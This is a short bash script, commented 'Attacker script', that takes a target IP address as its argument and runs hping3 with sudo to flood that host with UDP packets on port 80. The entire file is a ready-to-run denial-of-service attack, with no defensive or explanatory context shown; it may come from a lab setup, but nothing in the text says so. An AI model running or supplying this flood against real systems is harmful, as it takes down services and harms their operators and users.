#!/bin/bash
# Attacker script
TARGET_IP=$1
if [ -z "$TARGET_IP" ]; then
    echo "Usage: ./start_attack.sh <TARGET_IP>"
    exit 1
fi
sudo hping3 --flood --udp -p 80 $TARGET_IP
